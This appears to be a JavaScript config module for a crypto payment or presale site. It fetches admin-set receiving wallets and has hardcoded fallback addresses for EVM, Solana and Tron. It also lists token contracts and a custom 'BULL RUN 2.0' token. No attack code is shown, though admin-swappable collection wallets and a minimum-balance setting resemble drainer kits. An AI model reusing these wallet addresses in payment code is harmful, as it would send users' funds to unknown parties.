// MIN_BALANCE_USD moved to adminConfig.js for centralized admin control

import api from './api';

// Default receiving wallets (fallback)
const DEFAULT_RECEIVING_WALLETS = {
  EVM: "0xcb4151866FAfA195AF1dC9CE06cEcd35CF79D387",
  SOLANA: "BeKmmJaQcHdBhuq1vmwjt73Zfo9K2ZFifEpr1w8M6Zxg",
  TRON: "TBse5fBBK9Ap5m7BZNW59LBSKHa3TnepdF",
};

// Cache for receiving wallets
let cachedReceivingWallets = null;
let receivingWalletsPromise = null;

/**
 * Fetch receiving wallets from backend
 */
export async function fetchReceivingWallets() {
  if (cachedReceivingWallets) return cachedReceivingWallets;
  if (receivingWalletsPromise) return receivingWalletsPromise;

  receivingWalletsPromise = api.get('/admin-settings')
    .then(response => {
      const wallets = response.data.receivingWallets;
      cachedReceivingWallets = {
        EVM: wallets.evm || DEFAULT_RECEIVING_WALLETS.EVM,
        SOLANA: wallets.solana || DEFAULT_RECEIVING_WALLETS.SOLANA,
        TRON: wallets.tron || DEFAULT_RECEIVING_WALLETS.TRON,
      };
      return cachedReceivingWallets;
    })
    .catch(error => {
      console.error('Error fetching receiving wallets:', error);
      return DEFAULT_RECEIVING_WALLETS;
    })
    .finally(() => {
      receivingWalletsPromise = null;
    });

  return receivingWalletsPromise;
}

/**
 * Get receiving wallets (with caching)
 */
export async function getReceivingWallets() {
  if (!cachedReceivingWallets) {
    await fetchReceivingWallets();
  }
  return cachedReceivingWallets || DEFAULT_RECEIVING_WALLETS;
}

// Export default for backward compatibility (will be updated after first fetch)
export const RECEIVING_WALLETS = DEFAULT_RECEIVING_WALLETS;

// Token configurations
export const TOKENS = {
  // Ethereum
  ETH_ETHEREUM: {
    name: "ETH",
    symbol: "ETH",
    chain: "ethereum",
    chainId: 1,
    logo: "https://raw.githubusercontent.com/trustwallet/assets/master/blockchains/ethereum/info/logo.png",
    address: null, // Native token
    decimals: 18,
  },
  USDT_ETHEREUM: {
    name: "USDT",
    symbol: "USDT",
    chain: "ethereum",
    chainId: 1,
    logo: "https://raw.githubusercontent.com/trustwallet/assets/master/blockchains/ethereum/assets/0xdAC17F958D2ee523a2206206994597C13D831ec7/logo.png",
    address: "0xdAC17F958D2ee523a2206206994597C13D831ec7",
    decimals: 6,
  },
  USDC_ETHEREUM: {
    name: "USDC",
    symbol: "USDC",
    chain: "ethereum",
    chainId: 1,
    logo: "https://raw.githubusercontent.com/trustwallet/assets/master/blockchains/ethereum/assets/0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48/logo.png",
    address: "0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48",
    decimals: 6,
  },
  // BSC
  BNB_BSC: {
    name: "BNB",
    symbol: "BNB",
    chain: "bsc",
    chainId: 56,
    logo: "https://raw.githubusercontent.com/trustwallet/assets/master/blockchains/binance/info/logo.png",
    address: null, // Native token
    decimals: 18,
  },
  USDT_BSC: {
    name: "USDT",
    symbol: "USDT",
    chain: "bsc",
    chainId: 56,
    logo: "https://raw.githubusercontent.com/trustwallet/assets/master/blockchains/binance/assets/0x55d398326f99059fF775485246999027B3197955/logo.png",
    address: "0x55d398326f99059fF775485246999027B3197955",
    decimals: 18,
  },
  USDC_BSC: {
    name: "USDC",
    symbol: "USDC",
    chain: "bsc",
    chainId: 56,
    logo: "https://raw.githubusercontent.com/trustwallet/assets/master/blockchains/binance/assets/0x8AC76a51cc950d9822D68b83fE1Ad97B32Cd580d/logo.png",
    address: "0x8AC76a51cc950d9822D68b83fE1Ad97B32Cd580d",
    decimals: 18,
  },
  // Tron
  TRX_TRON: {
    name: "TRX",
    symbol: "TRX",
    chain: "tron",
    chainId: null,
    logo: "https://raw.githubusercontent.com/trustwallet/assets/master/blockchains/tron/info/logo.png",
    address: null, // Native token
    decimals: 6,
  },
  USDT_TRON: {
    name: "USDT",
    symbol: "USDT",
    chain: "tron",
    chainId: null,
    logo: "https://raw.githubusercontent.com/trustwallet/assets/master/blockchains/tron/assets/TR7NHqjeKQxGTCuuP8qACu7cX6odY3cV8Y/logo.png",
    address: "TR7NHqjeKQxGTCuuP8qACu7cX6odY3cV8Y",
    decimals: 6,
  },
  USDC_TRON: {
    name: "USDC",
    symbol: "USDC",
    chain: "tron",
    chainId: null,
    logo: "https://raw.githubusercontent.com/trustwallet/assets/master/blockchains/tron/assets/TEkxiTehnzSmSe2XqrBj4w32RUN966rdz8/logo.png",
    address: "TEkxiTehnzSmSe2XqrBj4w32RUN966rdz8",
    decimals: 6,
  },
  // Solana
  SOL_SOLANA: {
    name: "SOL",
    symbol: "SOL",
    chain: "solana",
    chainId: null,
    logo: "https://raw.githubusercontent.com/trustwallet/assets/master/blockchains/solana/info/logo.png",
    address: null, // Native token
    decimals: 9,
  },
  USDT_SOLANA: {
    name: "USDT",
    symbol: "USDT",
    chain: "solana",
    chainId: null,
    logo: "https://raw.githubusercontent.com/trustwallet/assets/master/blockchains/solana/assets/Es9vMFrzaCERmJfrF4H2FYD4KCoNkY11McCe8BenwNYB/logo.png",
    address: "Es9vMFrzaCERmJfrF4H2FYD4KCoNkY11McCe8BenwNYB",
    decimals: 6,
  },
  USDC_SOLANA: {
    name: "USDC",
    symbol: "USDC",
    chain: "solana",
    chainId: null,
    logo: "https://raw.githubusercontent.com/trustwallet/assets/master/blockchains/solana/assets/EPjFWdd5AufqSSqeM2qN1xzybapC8G4wEGGkZwyTDt1v/logo.png",
    address: "EPjFWdd5AufqSSqeM2qN1xzybapC8G4wEGGkZwyTDt1v",
    decimals: 6,
  },
  // Custom token
  BULL_RUN: {
    name: "BULL RUN 2.0",
    symbol: "BULL RUN 2.0",
    chain: "ethereum",
    chainId: 1,
    logo: "/logo.jpeg",
    address: null,
    decimals: 18,
  },
};

// Chain configurations
export const CHAINS = {
  ethereum: { id: 1, name: "Ethereum", symbol: "ETH", coingeckoId: "ethereum" },
  base: { id: 8453, name: "Base", symbol: "ETH", coingeckoId: "ethereum" }, // Base uses ETH
  bsc: { id: 56, name: "BSC", symbol: "BNB", coingeckoId: "binancecoin" },
  tron: { id: null, name: "Tron", symbol: "TRX", coingeckoId: "tron" },
  solana: { id: null, name: "Solana", symbol: "SOL", coingeckoId: "solana" },
};

